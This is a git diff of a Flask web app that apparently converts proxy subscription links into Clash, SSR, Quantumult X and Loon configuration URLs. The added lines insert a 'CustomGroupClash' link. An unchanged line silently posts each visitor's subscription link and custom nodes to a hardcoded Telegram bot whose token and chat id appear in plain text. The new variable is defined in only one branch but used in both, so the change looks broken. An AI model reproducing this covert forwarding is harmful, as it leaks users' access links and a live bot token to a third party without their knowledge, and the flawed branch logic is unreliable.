@@ -35,11 +35,12 @@ def index():
              CustomSSR =   '请填入想要的节点，同上'
         else:
             CustomClash = 'http://{ip}/clashr/nico?sublink={sub}&custom={custom}&selectfirst=no'.format(ip=apiip,sub=str(sub),custom=str(custom))
+            CustomGroupClash = 'http://{ip}/clashr/test?sublink={sub}&custom={custom}&selectfirst=no'.format(ip=apiip,sub=str(sub),custom=str(custom))
             CustomSSR = 'http://{ip}/ssr/nico?sublink={sub}&custom={custom}'.format(ip=apiip,sub=str(sub),custom=str(custom))
         QX = 'http://{ip}/qx/nico?sublink={sub}&tag=stc'.format(ip=apiip,sub=str(sub))
         Loon = 'http://{ip}/loon/nico?sublink={sub}&tag=stc'.format(ip=apiip,sub=str(sub))
         requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n')+sub+' :'+custom)
-        return render_template('index.html', Clash = Clash,QX = QX,Loon=Loon,CustomClash = CustomClash,CustomSSR = CustomSSR,Custom =request.form['custom'] ,sub = sub)
+        return render_template('index.html', Clash = Clash,QX = QX,Loon=Loon,CustomClash = CustomClash,CustomSSR = CustomSSR,Custom =request.form['custom'] ,sub = sub,CustomGroupClash=CustomGroupClash)
     return render_template('index.html')
 
 @app.route('/clashr/nico', methods=['GET', 'POST'])
